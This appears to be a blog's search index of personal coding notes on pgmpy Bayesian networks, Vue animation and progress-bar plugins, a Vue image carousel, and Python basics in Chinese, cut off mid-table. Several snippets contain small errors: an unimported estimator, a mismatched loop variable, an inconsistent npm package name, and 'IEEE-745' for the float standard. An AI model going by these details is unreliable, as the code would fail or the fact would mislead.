<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Python - Bayesian Network</title>
    <url>/myBlog/2022/11/13/2022/2022-11-BayesianNetwork/</url>
    <content><![CDATA[<h1 id="Bayesian-Network-in-pgmpy"><a href="#Bayesian-Network-in-pgmpy" class="headerlink" title="Bayesian Network in pgmpy"></a>Bayesian Network in <code>pgmpy</code></h1><ol>
<li><p>Import modules</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> pgmpy.models <span class="keyword">import</span> BayesianNetwork</span><br><span class="line"><span class="keyword">from</span> pgmpy.factors.discrete.CPD <span class="keyword">import</span> TabularCPD</span><br><span class="line"><span class="keyword">from</span> pgmpy.inference <span class="keyword">import</span> VariableElimination</span><br></pre></td></tr></table></figure>

</li>
<li><p>Construct the Bayesian Network</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">student_model = BayesianNetwork([</span><br><span class="line">    (<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>),</span><br><span class="line">    (<span class="string">&quot;C&quot;</span>, <span class="string">&quot;E&quot;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot the network</span></span><br><span class="line">nx.draw_circular(</span><br><span class="line">    student_model, with_labels=<span class="literal">True</span>, arrowsize=<span class="number">10</span>, node_size=<span class="number">4000</span>, alpha=<span class="number">0.3</span>, font_weight=<span class="string">&quot;bold&quot;</span></span><br><span class="line">)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
 <img src="https://p.ipic.vip/jmapf0.png" width="400px" />

</li>
<li><p>Set up the Conditional Probability Distribution and add the relationship</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set up the Conditional Probability Distribution</span></span><br><span class="line">A_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.4</span>],</span><br><span class="line">            [<span class="number">.6</span>]]</span><br><span class="line">)</span><br><span class="line">expl_B_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.7</span>],</span><br><span class="line">            [<span class="number">.3</span>]]</span><br><span class="line">)</span><br><span class="line">concept_c_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;C&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.9</span>, <span class="number">.5</span>, <span class="number">.4</span>, <span class="number">.05</span>],</span><br><span class="line">            [<span class="number">.1</span>, <span class="number">.5</span>, <span class="number">.6</span>, <span class="number">.95</span>]],</span><br><span class="line">    evidence = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line">concept_d_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;D&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.75</span>, <span class="number">.1</span>],</span><br><span class="line">            [<span class="number">.25</span>, <span class="number">.9</span>]],</span><br><span class="line">    evidence = [<span class="string">&#x27;C&#x27;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line">concept_e_cpd = TabularCPD(</span><br><span class="line">    variable = <span class="string">&quot;E&quot;</span>,</span><br><span class="line">    variable_card = <span class="number">2</span>,</span><br><span class="line">    values = [[<span class="number">.8</span>, <span class="number">.3</span>],</span><br><span class="line">            [<span class="number">.2</span>, <span class="number">.7</span>]],</span><br><span class="line">    evidence = [<span class="string">&#x27;C&#x27;</span>],</span><br><span class="line">    evidence_card = [<span class="number">2</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the relationships</span></span><br><span class="line">student_model.add_cpds(A_cpd, expl_B_cpd, concept_c_cpd, concept_d_cpd, concept_e_cpd)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Finally, we can inference</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pgmpy.inference <span class="keyword">import</span> VariableElimination</span><br><span class="line">student_model_infer = VariableElimination(student_model)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Conditional Probability Distribution of the understanding of D given evidence: not understand Expl A and B,&#x27;</span>)</span><br><span class="line">prob_understand_concept_d = student_model_infer.query(variables = [<span class="string">&#x27;D&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;B&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_understand_concept_d, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># Conditional Probability Distribution of the understanding of D given evidence: not understand Expl A and B,</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | D    |   phi(D) |</span></span><br><span class="line"><span class="comment"># +======+==========+</span></span><br><span class="line"><span class="comment"># | D(0) |   0.6850 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | D(1) |   0.3150 |</span></span><br><span class="line"><span class="comment"># +------+----------+ </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Conditional Probability Distribution of the understanding of E given evidence: understand C,&#x27;</span>)</span><br><span class="line">prob_understand_concept_e = student_model_infer.query(variables = [<span class="string">&#x27;E&#x27;</span>], evidence = &#123;<span class="string">&#x27;C&#x27;</span>:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_understand_concept_e)</span><br><span class="line"><span class="comment"># Conditional Probability Distribution of the understanding of E given evidence: understand C,</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | E    |   phi(E) |</span></span><br><span class="line"><span class="comment"># +======+==========+</span></span><br><span class="line"><span class="comment"># | E(0) |   0.3000 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br><span class="line"><span class="comment"># | E(1) |   0.7000 |</span></span><br><span class="line"><span class="comment"># +------+----------+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Inference-based-on-data"><a href="#Inference-based-on-data" class="headerlink" title="Inference based on data"></a>Inference based on data</h2><ul>
<li>We can inference based on a given data, then we can skip the step 3 that setting up the probability distribution  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Learning conditional probability distribution using Maximum likelihood estimators</span></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line">student_model.fit(data, estimator=MaximumLikelihoodEstimator)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inferencing with Bayesian Network</span></span><br><span class="line">model_infer = VariableElimination(student_model)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Probability of a student understands concept D, given evidence: understands both explanation A &amp; B</span></span><br><span class="line">prob_C = model_infer.query(variables = [<span class="string">&#x27;C&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;B&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="comment"># prob_D = model_infer.query(variables = [&#x27;E&#x27;],evidence = &#123;&#x27;A&#x27;:1, &#x27;B&#x27;:0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Probability of a student understands concept E, given evidence: understands concept C</span></span><br><span class="line">prob_E = model_infer.query(variables = [<span class="string">&#x27;E&#x27;</span>], evidence = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(prob_E)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>VueJS Dependency - Vue-Animate-Onscroll</title>
    <url>/myBlog/2022/08/23/2022/2022-8-23-PS-AnimationOnscroll/</url>
    <content><![CDATA[<h2 id="vue-animate-onscroll"><a href="#vue-animate-onscroll" class="headerlink" title="vue-animate-onscroll"></a>vue-animate-onscroll</h2><p>A simple Vue directive that animates elements as they scroll into view.</p>
<h3 id="Installation-and-Setup"><a href="#Installation-and-Setup" class="headerlink" title="Installation and Setup"></a>Installation and Setup</h3><ol>
<li><p>animate.css</p>
<ul>
<li><p>remember to install or import <code>animate.css</code> first.</p>
</li>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i v-animate-css</span><br></pre></td></tr></table></figure>
</li>
<li><p>setup in <code>main.js</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VAnimateCss</span> <span class="keyword">from</span> <span class="string">&#x27;v-animate-css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VAnimateCss</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>vue-animate-onscroll</p>
<ul>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install vue-animate-onscroll</span><br></pre></td></tr></table></figure>
</li>
<li><p>setup in <code>main.js</code></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VueAnimateOnscoll</span> <span class="keyword">from</span> <span class="string">&#x27;vue-animate-onscroll&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueAnimateOnscoll</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><ol>
<li><p>Bind</p>
<ul>
<li>use <code>v-animate-onscroll</code> to bind for a element  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated fadeIn&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Effect</p>
<ul>
<li>the effect name is totally same with <a href="https://animate.style/">animate.css</a></li>
<li>examples:  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated fadeIn&#x27;&quot;</span>&gt;</span>fadeIn<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-animate-onscroll</span>=<span class="string">&quot;&#x27;animated backInDown&#x27;&quot;</span>&gt;</span>backInDown<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>VueJS Implement - Images Gradient</title>
    <url>/myBlog/2022/08/20/2022/2022-8-20-PS-ImagesGradient/</url>
    <content><![CDATA[<h2 id="Images-Gradient-in-Vue2"><a href="#Images-Gradient-in-Vue2" class="headerlink" title="Images Gradient in Vue2"></a>Images Gradient in Vue2</h2><p>Realize image gradient effect in Vue2.</p>
<h3 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h3><ol>
<li>Use <transition-group> as a wrapper for setting the gradient animations.</li>
<li>Use <code>v-for</code> directive to traverse the list of images.</li>
<li>Use <code>v-show</code> directive to show the current image and hide the others images.</li>
<li>Use <code>:style</code> directive to bind a background-image style for each <div> and display each images as a background-image of the <div>.</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">tag</span>=<span class="string">&quot;ul&quot;</span> <span class="attr">name</span>=<span class="string">&quot;img&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span></span></span><br><span class="line"><span class="tag">        <span class="attr">class</span>=<span class="string">&quot;image-container&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-for</span>=<span class="string">&quot;(img, index) in imgArr&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-show</span>=<span class="string">&quot;index === currIndex&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;image&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;&#x27;background-image&#x27;: &#x27;url(&#x27; + i + &#x27;)&#x27;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><ol>
<li><code>currIndex</code>, represent the index of current image.</li>
<li><code>imgArr</code>, which saved the relative link of all images.</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">currIndex</span>: <span class="number">0</span>,</span><br><span class="line"><span class="attr">imgArr</span>: [</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A01.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A02.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A03.webp&#x27;</span>),</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;../../assets/background/A04.webp&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>Notice: <font color="#f54747">Remember to use <code>require()</code> to parse the relative link, otherwise it can’t get the images</font></li>
</ul>
<h3 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h3><ul>
<li><code>autoPlay</code>, a method to update the currIndex in each n seconds.</li>
<li>Call the method when the component is mounted.<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">autoPlay</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">currIndex</span> = (<span class="variable language_">this</span>.<span class="property">currIndex</span> &lt; <span class="variable language_">this</span>.<span class="property">imgArr</span>.<span class="property">length</span> - <span class="number">1</span>) ? <span class="variable language_">this</span>.<span class="property">currIndex</span> + <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">        &#125;, <span class="number">4000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">autoPlay</span>()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Styles"><a href="#Styles" class="headerlink" title="Styles"></a>Styles</h3><ul>
<li>Apply the animation: set the <code>opacity</code>, <code>transition</code> and <code>z-index</code> for the entering and leaving element.<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.img-enter-active</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: opacity <span class="number">3s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-leave-active</span> &#123;</span><br><span class="line">    <span class="attribute">transition</span>: <span class="number">3s</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-enter</span>&#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.img-enter-to</span>&#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>VueJS Dependency - Easy-Circular-Progress</title>
    <url>/myBlog/2022/08/24/2022/2022-8-24-PS-EasyCircularProgress/</url>
    <content><![CDATA[<h2 id="easy-circular-progress"><a href="#easy-circular-progress" class="headerlink" title="easy-circular-progress"></a>easy-circular-progress</h2><p>To create a circular-progress-bar</p>
<h3 id="Installation-and-Setup"><a href="#Installation-and-Setup" class="headerlink" title="Installation and Setup"></a>Installation and Setup</h3><ol>
<li>circular-progress-bar<ul>
<li><p>install</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install circular-progress-bar</span><br></pre></td></tr></table></figure>
</li>
<li><p>import in components</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Progress</span> <span class="keyword">from</span> <span class="string">&#x27;easy-circular-progress/src/index.vue&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Prop-Types"><a href="#Prop-Types" class="headerlink" title="Prop Types"></a>Prop Types</h3><table>
<thead>
<tr>
<th align="left">Property</th>
<th align="left">Type</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">strokeWidth</td>
<td align="left">Number</td>
<td align="left">the width of the progress circle</td>
</tr>
<tr>
<td align="left">radius</td>
<td align="left">Number</td>
<td align="left">the inner circle radius</td>
</tr>
<tr>
<td align="left">transitionDuration</td>
<td align="left">Number</td>
<td align="left">transitionDuration for the animation</td>
</tr>
<tr>
<td align="left">strokeColors</td>
<td align="left">String</td>
<td align="left">e.g. ‘#aaff00’</td>
</tr>
<tr>
<td align="left">value</td>
<td align="left">Number</td>
<td align="left">Progress Length, between 0 and 100</td>
</tr>
</tbody></table>
<ol>
<li><code>value</code>: <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Progress</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">&quot;progress-bar&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:value</span>=<span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:strokeColor</span>=<span class="string">&quot;i.color&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:strokeWidth</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:radius</span>=<span class="string">&quot;50&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:transitionDuration</span>=<span class="string">&quot;2000&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>ProblemSolving</category>
      </categories>
  </entry>
  <entry>
    <title>Python - Basic</title>
    <url>/myBlog/2022/08/28/2022/2022-8-28-Python-Basic/</url>
    <content><![CDATA[<h2 id="Print-amp-Input"><a href="#Print-amp-Input" class="headerlink" title="Print &amp; Input"></a>Print &amp; Input</h2><ol>
<li>接收用戶輸入<ul>
<li>使用<code>input</code>方法  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temp = <span class="built_in">input</span>(<span class="string">&#x27;Guess a number&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="字符串語法"><a href="#字符串語法" class="headerlink" title="字符串語法"></a>字符串語法</h2><ol>
<li><p>原始字符串<code>r</code></p>
<ul>
<li>在字符串的前面加上一個<code>r</code>，則表示原始字符串，轉譯字符則不再有效  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;Hello World \n&quot;</span>)    <span class="comment"># Hello World \n</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>長字符串</p>
<ul>
<li>專門用於實現跨行字符串  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Hello World 1</span></span><br><span class="line"><span class="string">Hello World 2</span></span><br><span class="line"><span class="string">Hello World 3</span></span><br><span class="line"><span class="string">Hello World 4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>字符串乘法複製</p>
<ul>
<li>將字符串重複指定次數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;HelloWorld &#x27;</span> * <span class="number">3</span>)    <span class="comment"># HelloWorld HelloWorld HelloWorld </span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="random-module"><a href="#random-module" class="headerlink" title="random module"></a>random module</h2><ol>
<li><p>生成隨機整數：</p>
<ul>
<li><code>random.randint(a,b)</code>隨機生成 a - b 的函數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>獲取偽隨機數攻擊：</p>
<ul>
<li>使用<code>random.getstate()</code>獲取隨機數種子加工後隨機數生成器內部狀態</li>
<li>使用<code>random.setstate()</code>設置隨機數生成器的內部狀態</li>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = random.getstate()</span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 2</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 3</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 4</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">random.setstate(x)</span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 2</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 3</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 4</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="數字類型-Number"><a href="#數字類型-Number" class="headerlink" title="數字類型 Number"></a>數字類型 Number</h2><ol>
<li><p>整數型：</p>
<ul>
<li>python int類型沒有大小限制</li>
</ul>
</li>
<li><p>浮點型：</p>
<ul>
<li>基於IEEE-745算法，因此會出現誤差  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">0.1</span> + <span class="number">0.2</span>)    <span class="comment"># 0.30000000000000004</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>decimal module 精確計算：</p>
<ul>
<li>使用<code>decimal.Decimal(&#39;x&#39;)</code>聲明  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = decimal.Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">b = decimal.Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a + b)    <span class="comment"># 0.3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>科學計數法：</p>
<ul>
<li>python會使用科學計算法來儲存小數點數字  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">0.00005</span>)  <span class="comment"># 5e-05</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>複數 Complex Number：</p>
<ul>
<li>以浮點型儲存  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1</span> + <span class="number">2j</span></span><br><span class="line">x.real  <span class="comment"># 1.0</span></span><br><span class="line">x.imag  <span class="comment"># 2.0</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Calculation</p>
<table>
<thead>
<tr>
<th align="center">Operations</th>
<th align="center">Descriptions</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>x + y</code></td>
<td align="center">Addition</td>
</tr>
<tr>
<td align="center"><code>x - y</code></td>
<td align="center">Subtraction</td>
</tr>
<tr>
<td align="center"><code>x * y</code></td>
<td align="center">Multiplication</td>
</tr>
<tr>
<td align="center"><code>x / y</code></td>
<td align="center">Division</td>
</tr>
<tr>
<td align="center"><code>x // y</code></td>
<td align="center">Quotient</td>
</tr>
<tr>
<td align="center"><code>x % y</code></td>
<td align="center">Remainder</td>
</tr>
<tr>
<td align="center"><code>-x</code></td>
<td align="center">x reverses</td>
</tr>
<tr>
<td align="center"><code>+x</code></td>
<td align="center">x itself</td>
</tr>
<tr>
<td align="center"><code>abs(x)</code></td>
<td align="center">Absolute value</td>
</tr>
<tr>
<td align="center"><code>int(x)</code></td>
<td align="center">Turn x into an integer</td>
</tr>
<tr>
<td align="center"><code>float(x)</code></td>
<td align="center">Turn x into a float</td>
</tr>
<tr>
<td align="center"><code>complex(re, im)</code></td>
<td align="center">Return a complex number</td>
</tr>
<tr>
<td align="center"><code>x.conjugate()</code></td>
<td align="center">x’s conjugate</td>
</tr>
<tr>
<td align="center"><code>divmod(x, y)</code></td>
<td align="center">Return (Quotient, Remainder)</td>
</tr>
<tr>
<td align="center"><code>pow(x, y)</code></td>
<td align="center">x ^ y</td>
</tr>
<tr>
<td align="center"><code>x ** y</code></td>
<td align="center">x ^ y</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="布爾值-Boolean"><a href="#布爾值-Boolean" class="headerlink" title="布爾值 Boolean"></a>布爾值 Boolean</h2><ol>
<li><p><code>False</code>的情況：</p>
<ol>
<li>定義為<code>False</code>的對象：<code>None</code>, <code>False</code></li>
<li>數值為0的數字類型：<code>0</code>, <code>0.0</code>, <code>0j</code>, <code>Decimal(0)</code>, <code>Fraction(0, 1)</code></li>
<li>空的序列和集合：<code>&quot;&quot;</code>, <code>()</code>, <code>[]</code>, <code>&#123;&#125;</code>, <code>set()</code>, <code>range(0)</code></li>
</ol>
<ul>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bool</span>(<span class="number">123</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27; &#x27;</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="number">0</span>)     <span class="comment"># False</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">False</span>) <span class="comment"># False</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>邏輯運算符：</p>
<ul>
<li><code>and</code>, <code>or</code>, <code>not</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> &lt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">4</span> &lt; <span class="number">5</span>     <span class="comment"># True</span></span><br><span class="line"><span class="number">3</span> &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="number">6</span> &lt; <span class="number">5</span>      <span class="comment"># True</span></span><br><span class="line"><span class="keyword">not</span> <span class="number">3</span> &lt; <span class="number">4</span>           <span class="comment"># False</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>短路求值 Short-Circuit Evaluation：</p>
<ul>
<li>從左往右，只當第一個操作數的值無法確定邏輯運算結果時，才對第二個操作數進行求值  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>     <span class="comment"># 4</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">or</span> <span class="number">4</span>      <span class="comment"># 3</span></span><br><span class="line">(<span class="keyword">not</span> <span class="number">1</span>) <span class="keyword">or</span> (<span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span>) <span class="keyword">or</span> (<span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>) <span class="keyword">or</span> (<span class="number">5</span> <span class="keyword">and</span> <span class="number">6</span>) <span class="keyword">or</span> (<span class="number">7</span> <span class="keyword">and</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">9</span>)   <span class="comment"># False or 0 or 4 or 6 or 9 == 4</span></span><br><span class="line"><span class="keyword">not</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span> <span class="keyword">or</span> <span class="number">5</span> <span class="keyword">and</span> <span class="number">6</span> <span class="keyword">or</span> <span class="number">7</span> <span class="keyword">and</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">9</span>     <span class="comment"># False or 0 or 4 or 6 or 9 == 4</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>運算符優先級 Precedence of Operators：</p>
<table>
<thead>
